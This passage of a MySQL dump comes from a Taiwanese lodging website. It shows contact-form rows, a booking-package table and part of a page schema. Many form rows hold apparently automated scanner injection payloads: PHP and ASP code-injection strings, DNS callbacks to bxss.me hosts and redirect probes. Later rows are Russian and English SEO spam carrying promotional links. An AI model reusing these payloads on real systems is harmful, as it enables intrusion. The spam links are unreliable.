(314, 1679624517, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '\'+response.write(9942428*9779051)+\'', '555'),
(315, 1679624520, NULL, 'uFPKKsNb', 'sample@email.tst', ';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));', '555-666-0606', '1', '555'),
(316, 1679624522, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '\"+response.write(9942428*9779051)+\"', '555'),
(317, 1679624525, NULL, 'uFPKKsNb', 'sample@email.tst', '\';print(md5(31337));$a=\'', '555-666-0606', '1', '555'),
(318, 1679624528, NULL, 'uFPKKsNb', 'sample@email.tst', '\'.gethostbyname(lc(\'hitli\'.\'dnnbujtife700.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(114).chr(85).chr(106).chr(70).\'', '555-666-0606', '1', '555'),
(319, 1679624531, NULL, 'uFPKKsNb', 'sample@email.tst', '\";print(md5(31337));$a=\"', '555-666-0606', '1', '555'),
(320, 1679624534, NULL, 'uFPKKsNb', 'sample@email.tst', '\".gethostbyname(lc(\"hitbs\".\"gvavxquj7ad7a.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(98).chr(81).chr(98).chr(67).\"', '555-666-0606', '1', '555'),
(321, 1679624536, NULL, 'uFPKKsNb', 'sample@email.tst', '${@print(md5(31337))}', '555-666-0606', '1', '555'),
(322, 1679624539, NULL, 'uFPKKsNb', 'sample@email.tst', '${@print(md5(31337))}\\', '555-666-0606', '1', '555'),
(323, 1679624542, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '\'.gethostbyname(lc(\'hittw\'.\'zteycjkw1b6be.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(103).chr(89).chr(121).chr(89).\''),
(324, 1679624546, NULL, 'uFPKKsNb', 'sample@email.tst', '\'.print(md5(31337)).\'', '555-666-0606', '1', '555'),
(325, 1679624548, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '\".gethostbyname(lc(\"hitij\".\"qmmjlifg1a0b0.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(113).chr(90).chr(119).chr(69).\"'),
(326, 1679624563, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', ';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));'),
(327, 1679624565, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(328, 1679624568, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '\';print(md5(31337));$a=\''),
(329, 1679624571, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(330, 1679624574, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '\";print(md5(31337));$a=\"'),
(331, 1679624577, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '${@print(md5(31337))}'),
(332, 1679624580, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '${@print(md5(31337))}\\'),
(333, 1679624582, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '\'.gethostbyname(lc(\'hitzc\'.\'xsoppmcn25a20.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(101).chr(81).chr(115).chr(80).\'', '555'),
(334, 1679624586, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '\'.print(md5(31337)).\''),
(335, 1679624588, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '\".gethostbyname(lc(\"hityt\".\"ydreiqjh9281f.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(115).chr(76).chr(109).chr(67).\"', '555'),
(336, 1679624591, NULL, ';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(337, 1679624594, NULL, 'uFPKKsNb', 'sample@email.tst', NULL, '555-666-0606', '1', '555'),
(338, 1679624597, NULL, '\';print(md5(31337));$a=\'', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(339, 1679624600, NULL, 'uFPKKsNb', 'sample@email.tst', '\'\"()', '555-666-0606', '1', '555'),
(340, 1679624603, NULL, '\";print(md5(31337));$a=\"', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(341, 1679624606, NULL, '${@print(md5(31337))}', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(342, 1679624609, NULL, '${@print(md5(31337))}\\', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(343, 1679624612, NULL, '\'.print(md5(31337)).\'', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(344, 1679624614, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '\'\"()'),
(345, 1679624617, NULL, 'uFPKKsNb', 'sample@email.tst', '555', ';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));', '1', '555'),
(346, 1679624620, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '\';print(md5(31337));$a=\'', '1', '555'),
(347, 1679624623, NULL, '\'\"()', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(348, 1679624626, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '\";print(md5(31337));$a=\"', '1', '555'),
(349, 1679624629, NULL, 'uFPKKsNb', 'sample@email.tst', '555', NULL, '1', '555'),
(350, 1679624632, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '${@print(md5(31337))}', '1', '555'),
(351, 1679624634, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '\'\"()', '1', '555'),
(352, 1679624638, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '${@print(md5(31337))}\\', '1', '555'),
(353, 1679624641, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(354, 1679624644, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '\'.print(md5(31337)).\'', '1', '555'),
(355, 1679624647, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(356, 1679624649, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(357, 1679624652, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(358, 1679624655, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '\'\"()', '555'),
(359, 1679624658, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(360, 1679624661, NULL, 'uFPKKsNb', 'sample@email.tst', ')', '555-666-0606', '1', '555'),
(361, 1679624664, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(362, 1679624667, NULL, 'uFPKKsNb', 'sample@email.tst', '!(()&&!|*|*|', '555-666-0606', '1', '555'),
(363, 1679624670, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(364, 1679624673, NULL, 'uFPKKsNb', 'sample@email.tst', '^(#$!@#$)(()))******', '555-666-0606', '1', '555'),
(365, 1679624675, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(366, 1679624678, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', ')'),
(367, 1679624681, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '!(()&&!|*|*|'),
(368, 1679624685, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '^(#$!@#$)(()))******'),
(369, 1679624687, NULL, ')', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(370, 1679624690, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', ';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));', '555'),
(371, 1679624693, NULL, '!(()&&!|*|*|', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(372, 1679624696, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '\';print(md5(31337));$a=\'', '555'),
(373, 1679624699, NULL, '^(#$!@#$)(()))******', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(374, 1679624702, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '\";print(md5(31337));$a=\"', '555'),
(375, 1679624706, NULL, 'uFPKKsNb', 'sample@email.tst', '555', ')', '1', '555'),
(376, 1679624709, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '${@print(md5(31337))}', '555'),
(377, 1679624712, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '!(()&&!|*|*|', '1', '555'),
(378, 1679624715, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '${@print(md5(31337))}\\', '555'),
(379, 1679624718, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '^(#$!@#$)(()))******', '1', '555'),
(380, 1679624720, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '\'.print(md5(31337)).\'', '555'),
(381, 1679624723, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(382, 1679624726, NULL, 'uFPKKsNb', 'sample@email.tst', '555&n971168=v920040', '555-666-0606', '1', '555'),
(383, 1679624730, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(384, 1679624733, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(385, 1679624736, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555&n940469=v923389'),
(386, 1679624739, NULL, 'uFPKKsNb&n933659=v952738', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(387, 1679624743, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', ')', '555'),
(388, 1679624745, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606&n959272=v928237', '1', '555'),
(389, 1679624748, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '!(()&&!|*|*|', '555'),
(390, 1679624751, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(391, 1679624754, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '^(#$!@#$)(()))******', '555'),
(392, 1679624757, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(393, 1679624760, NULL, 'uFPKKsNb', 'sample@email.tst', ')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))', '555-666-0606', '1', '555'),
(394, 1679624763, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1&n989318=v998071', '555'),
(395, 1679624766, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', ')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))'),
(396, 1679624769, NULL, 'uFPKKsNb', 'sample@email.tst', '/xfs.bxss.me', '555-666-0606', '1', '555'),
(397, 1679624771, NULL, ')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(398, 1679624774, NULL, 'uFPKKsNb', 'sample@email.tst', '915282', '555-666-0606', '1', '555'),
(399, 1679624777, NULL, 'uFPKKsNb', 'sample@email.tst', '555', ')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))', '1', '555'),
(400, 1679624780, NULL, 'uFPKKsNb', 'sample@email.tst', 'http://xfs.bxss.me', '555-666-0606', '1', '555'),
(401, 1679624783, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(402, 1679624786, NULL, 'uFPKKsNb', 'sample@email.tst', '//xfs.bxss.me', '555-666-0606', '1', '555'),
(403, 1679624789, NULL, 'uFPKKsNb', 'sample@email.tst', '/\\xfs.bxss.me', '555-666-0606', '1', '555'),
(404, 1679624791, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', ')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))', '555'),
(405, 1679624794, NULL, 'uFPKKsNb', 'sample@email.tst', '\'\"', '555-666-0606', '1', '555'),
(406, 1679624797, NULL, 'uFPKKsNb', 'sample@email.tst', '<!--', '555-666-0606', '1', '555'),
(407, 1679624801, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '/xfs.bxss.me'),
(408, 1679624803, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '940137'),
(409, 1679624806, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '\'\"'),
(410, 1679624809, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', 'http://xfs.bxss.me'),
(411, 1679624812, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '<!--'),
(412, 1679624815, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '//xfs.bxss.me'),
(413, 1679624818, NULL, '\'\"', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(414, 1679624821, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '/\\xfs.bxss.me'),
(415, 1679624824, NULL, '<!--', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(416, 1679624826, NULL, '/xfs.bxss.me', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(417, 1679624829, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '\'\"', '1', '555'),
(418, 1679624832, NULL, '901389', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(419, 1679624835, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '<!--', '1', '555'),
(420, 1679624838, NULL, 'http://xfs.bxss.me', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(421, 1679624840, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(422, 1679624843, NULL, '//xfs.bxss.me', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(423, 1679624846, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(424, 1679624849, NULL, '/\\xfs.bxss.me', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(425, 1679624852, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '/xfs.bxss.me', '1', '555'),
(426, 1679624854, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '\'\"', '555'),
(427, 1679624857, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '932079', '1', '555'),
(428, 1679624860, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '<!--', '555'),
(429, 1679624863, NULL, 'uFPKKsNb', 'sample@email.tst', '555', 'http://xfs.bxss.me', '1', '555'),
(430, 1679624867, NULL, 'uFPKKsNb', 'sample@email.tst', '\"+\"A\".concat(70-3).concat(22*4).concat(118).concat(75).concat(100).concat(84)+(require\"socket\"\nSocket.gethostbyname(\"hitwk\"+\"glcuokpb45ce0.bxss.me.\")[3].to_s)+\"', '555-666-0606', '1', '555'),
(431, 1679624870, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '//xfs.bxss.me', '1', '555'),
(432, 1679624873, NULL, 'uFPKKsNb', 'sample@email.tst', '\'+\'A\'.concat(70-3).concat(22*4).concat(99).concat(84).concat(107).concat(81)+(require\'socket\'\nSocket.gethostbyname(\'hitrl\'+\'rncjjbct30a26.bxss.me.\')[3].to_s)+\'', '555-666-0606', '1', '555'),
(433, 1679624876, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '/\\xfs.bxss.me', '1', '555'),
(434, 1679624878, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(435, 1679624881, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '\"+\"A\".concat(70-3).concat(22*4).concat(118).concat(79).concat(117).concat(75)+(require\"socket\"\nSocket.gethostbyname(\"hiter\"+\"eigisodu91056.bxss.me.\")[3].to_s)+\"'),
(436, 1679624884, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '/xfs.bxss.me', '555'),
(437, 1679624887, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '\'+\'A\'.concat(70-3).concat(22*4).concat(99).concat(67).concat(111).concat(69)+(require\'socket\'\nSocket.gethostbyname(\'hitjs\'+\'gyhpgocyde0a4.bxss.me.\')[3].to_s)+\''),
(438, 1679624890, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '936682', '555'),
(439, 1679624896, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', 'http://xfs.bxss.me', '555'),
(440, 1679624901, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '//xfs.bxss.me', '555'),
(441, 1679624907, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '/\\xfs.bxss.me', '555'),
(442, 1679624913, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(443, 1679624916, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '1', '555'),
(444, 1679624919, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '\"+\"A\".concat(70-3).concat(22*4).concat(100).concat(66).concat(120).concat(72)+(require\"socket\"\nSocket.gethostbyname(\"hitwh\"+\"muggwsqt50edd.bxss.me.\")[3].to_s)+\"', '555'),
(445, 1679624922, NULL, 'uFPKKsNb', 'sample@email.tst', '555', '555-666-0606', '\'+\'A\'.concat(70-3).concat(22*4).concat(101).concat(80).concat(114).concat(75)+(require\'socket\'\nSocket.gethostbyname(\'hitpi\'+\'dfjdsibf43974.bxss.me.\')[3].to_s)+\'', '555'),
(446, 1679919159, NULL, 'AlbertZoors', 'pokr.asse.re.g.a.p.e.n.z.a.@gmail.com', 'https://seoprofisional.ru', '87923441979', 'продвижение медицинских сайтов', 'Заказать прогон \r\nXrumer и GSA, allsubmitter \r\n \r\nЕсли Вы хотите, чтоб Ваш сайт привлекал как можно больше посетителей, \r\nто нужно, чтоб он был не только полезным и удобным, но и хорошо оптимизированным для поисковиков. \r\nЭто потребует немало усилий и затрат, однако если хотите здорово ускорить процесс и ощутимо поднять сайт в результате выдачи, то можно использовать прогон сайта хрумером. \r\nТаким образом Вы можете не только быстрей получить желаемый результат, \r\nно и даже сэкономить время и деньги. \r\n \r\n<a href=https://seoprofisional.ru/bazy/progon-po-baze/zakazat-progon>прогону хрумером</a> \r\nХрумер — это софт для массовой рассылки комментариев на различные блоги, \r\nсайты, доски объявлений и даже социальные сети. \r\nПрогон по форумам происходит автоматически, ведь алгоритмы программы способны самостоятельно регистрировать \r\nаккаунты на сайтах, обходить капчи и любую другую защиту от автоматических регистраций и публикаций. \r\nДанный программный продукт развивается уже много лет и может работать с разнообразными CMS \r\n \r\nЗАКАЗТЬ ПРОГОНЫ МОЖНО ЧЕРЕЗ СКАЙП ЛОГИН POKRAS7777 \r\nИЛИ ЧЕРЕЗ ТЕЛЕГРАММ @pokras777 \r\nИЛИ ПИШИТЕ НА ПОЧТУ BIKON777@YANDEX.RU \r\n \r\nФухты1'),
(447, 1682016853, NULL, 'Rozella', 'seosubmitter@mail.com', 'You are looking for Free Backlinks for goh.org.tw \r\n\r\nWe offering you a free trial to try out our link-building service.\r\n\r\nThis can be used to link out to your website, inner page, google map, video, to any link you want to help power up and get more relevance too.\r\n\r\nWe want to prove to you that our backlinks work and so we’re willing to prove it to you risk-free.\r\n\r\nSubmit your details >>  https://zeep.ly/sTQKV\r\n\r\nThanks, \r\nRancourt\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nNorway, NA, Bergen, 5011, Nedre Strangehagen 214\r\n \r\nTo stop any further communication through your website form, Please reply with subject:  Unsubscribe goh.org.tw', '925 94 086', 'You are looking for Free Backlinks', 'You are looking for Free Backlinks for goh.org.tw \r\n\r\nWe offering you a free trial to try out our link-building service.\r\n\r\nThis can be used to link out to your website, inner page, google map, video, to any link you want to help power up and get more relevance too.\r\n\r\nWe want to prove to you that our backlinks work and so we’re willing to prove it to you risk-free.\r\n\r\nSubmit your details >>  https://zeep.ly/sTQKV\r\n\r\nThanks, \r\nRancourt\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nNorway, NA, Bergen, 5011, Nedre Strangehagen 214\r\n \r\nTo stop any further communication through your website form, Please reply with subject:  Unsubscribe goh.org.tw'),
(448, 1682399953, NULL, 'Lenard', 'seosubmitter@mail.com', 'You are looking for Free Backlinks for goh.org.tw \r\n\r\nWe offering you a free trial to try out our link-building service.\r\n\r\nThis can be used to link out to your website, inner page, google map, video, to any link you want to help power up and get more relevance too.\r\n\r\nWe want to prove to you that our backlinks work and so we’re willing to prove it to you risk-free.\r\n\r\nSubmit your details >>  https://zeep.ly/sTQKV\r\n\r\nThanks, \r\nCribb\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nAustralia, NT, Ayers Rock, 872, 28 Tanner Street\r\n \r\nTo stop any further communication through your website form, Please reply with subject:  Unsubscribe goh.org.tw', '(08) 8263 6168', 'You are looking for Free Backlinks', 'You are looking for Free Backlinks for goh.org.tw \r\n\r\nWe offering you a free trial to try out our link-building service.\r\n\r\nThis can be used to link out to your website, inner page, google map, video, to any link you want to help power up and get more relevance too.\r\n\r\nWe want to prove to you that our backlinks work and so we’re willing to prove it to you risk-free.\r\n\r\nSubmit your details >>  https://zeep.ly/sTQKV\r\n\r\nThanks, \r\nCribb\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nAustralia, NT, Ayers Rock, 872, 28 Tanner Street\r\n \r\nTo stop any further communication through your website form, Please reply with subject:  Unsubscribe goh.org.tw'),
(449, 1682702589, NULL, 'Elvis', 'seosubmitter@mail.com', 'You are looking for Free Backlinks for goh.org.tw \r\n\r\nWe offering you a free trial to try out our link-building service.\r\n\r\nThis can be used to link out to your website, inner page, google map, video, to any link you want to help power up and get more relevance too.\r\n\r\nWe want to prove to you that our backlinks work and so we’re willing to prove it to you risk-free.\r\n\r\nSubmit your details >>  https://zeep.ly/sTQKV\r\n\r\nThanks, \r\nLimon\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nAustria, TYROL, Vill, 6080, Spittelwiese 68\r\n \r\nTo stop any further communication through your website form, Please reply with subject:  Unsubscribe goh.org.tw', '0680 100 12 19', 'You are looking for Free Backlinks for goh.org.tw', 'You are looking for Free Backlinks for goh.org.tw \r\n\r\nWe offering you a free trial to try out our link-building service.\r\n\r\nThis can be used to link out to your website, inner page, google map, video, to any link you want to help power up and get more relevance too.\r\n\r\nWe want to prove to you that our backlinks work and so we’re willing to prove it to you risk-free.\r\n\r\nSubmit your details >>  https://zeep.ly/sTQKV\r\n\r\nThanks, \r\nLimon\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nAustria, TYROL, Vill, 6080, Spittelwiese 68\r\n \r\nTo stop any further communication through your website form, Please reply with subject:  Unsubscribe goh.org.tw'),
(450, 1682866392, NULL, 'Lashunda', 'seosubmitter@mail.com', 'You are looking for Free Backlinks for goh.org.tw \r\n\r\nWe offering you a free trial to try out our link-building service.\r\n\r\nThis can be used to link out to your website, inner page, google map, video, to any link you want to help power up and get more relevance too.\r\n\r\nWe want to prove to you that our backlinks work and so we’re willing to prove it to you risk-free.\r\n\r\nSubmit your details >>  https://zeep.ly/sTQKV\r\n\r\nThanks, \r\nMichael\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nGreat Britain, NA, Thwaite, Ip23 1wx, 40 Brackley Road\r\n \r\nTo stop any further communication through your website form, Please reply with subject:  Unsubscribe goh.org.tw', '078 3373 6980', 'You are looking for Free Backlinks for goh.org.tw', 'You are looking for Free Backlinks for goh.org.tw \r\n\r\nWe offering you a free trial to try out our link-building service.\r\n\r\nThis can be used to link out to your website, inner page, google map, video, to any link you want to help power up and get more relevance too.\r\n\r\nWe want to prove to you that our backlinks work and so we’re willing to prove it to you risk-free.\r\n\r\nSubmit your details >>  https://zeep.ly/sTQKV\r\n\r\nThanks, \r\nMichael\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\nGreat Britain, NA, Thwaite, Ip23 1wx, 40 Brackley Road\r\n \r\nTo stop any further communication through your website form, Please reply with subject:  Unsubscribe goh.org.tw'),
(451, 1696221468, NULL, 'AlbertZoors', 'vova80918@mail.ru', 'https://seoprofisional.ru', '87595833391', 'кислород жк сочи ход строительства', 'Это жилой комплекс бизнес-класса, расположенный на северном склоне горы Бытха. Здесь в целебном кислородном коктейле соединяются свежий морской воздух и аромат хвои предгорья. \r\n<a href=http://zhk-kislorod-v-sochi.ru/>купить квартиру на стадии строительства от застройщика в сочи</a>');

-- --------------------------------------------------------

--
-- 資料表結構 `pm_package`
--

CREATE TABLE `pm_package` (
  `id` int(11) NOT NULL,
  `users` text DEFAULT NULL,
  `name` varchar(50) DEFAULT NULL,
  `days` text DEFAULT NULL,
  `min_nights` int(11) DEFAULT NULL,
  `max_nights` int(11) DEFAULT NULL,
  `day_start` int(11) DEFAULT NULL,
  `day_end` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- 傾印資料表的資料 `pm_package`
--

INSERT INTO `pm_package` (`id`, `users`, `name`, `days`, `min_nights`, `max_nights`, `day_start`, `day_end`) VALUES
(1, '1', '住周末(週五、周六)', '5,6', 1, 0, NULL, NULL),
(2, '1', '只住1晚', '1,2,3,4,5,6,7', 0, 0, NULL, NULL),
(3, '1', '平日入住(週一至週四或週日)', '1,2,3,4,7', 1, 0, NULL, NULL),
(4, '1', '2 nights', '1,2,3,4', 2, 2, NULL, NULL),
(5, '1', '5天方案', '1,2,3,4,5,6,7', 5, 0, NULL, NULL),
(6, '2', '連續假日(落在日一二)', '1,2,7', 1, 3, 7, 3),
(9, '1', '只住周末(週五晚)', '5', 1, 0, 5, 6),
(10, '1', '只住周末(週六晚)', '6', 1, 0, 6, 7),
(11, '1', '假日專用(週日至周六全7天假日)', '1,2,3,4,5,6,7', 0, 0, NULL, NULL),
(12, '1', '平日測試(週一至週四和週日)', '1,2,3,4,7', 1, 0, NULL, NULL),
(13, '1', '週末測試(週五晚周六晚)', '5,6', 1, 0, NULL, NULL),
(14, '1', '清明假期測試', '1,2,3,6,7', 1, 0, NULL, NULL),
(15, '2', '禮拜日但是是假日價', '7', 1, 1, 7, 1),
(16, '2', '端午連假', '3,4,5,6', 1, 4, NULL, NULL),
(17, '2', '暑假期間', '1,2,3,4,5,6,7', 0, 0, NULL, NULL);

-- --------------------------------------------------------

--
-- 資料表結構 `pm_page`
--

CREATE TABLE `pm_page` (
  `id` int(11) NOT NULL,
  `lang` int(11) NOT NULL,
  `name` varchar(50) DEFAULT NULL,
  `title` varchar(250) DEFAULT NULL,
  `subtitle` varchar(250) DEFAULT NULL,
  `title_tag` varchar(250) DEFAULT NULL,
  `alias` varchar(100) DEFAULT NULL,
  `descr` longtext DEFAULT NULL,
  `robots` varchar(20) DEFAULT NULL,
  `keywords` varchar(250) DEFAULT NULL,
  `intro` longtext DEFAULT NULL,
  `text` longtext DEFAULT NULL,
  `id_parent` int(11) DEFAULT NULL,
  `page_model` varchar(50) DEFAULT NULL,
  `article_model` varchar(50) DEFAULT NULL,
  `home` int(11) DEFAULT 0,
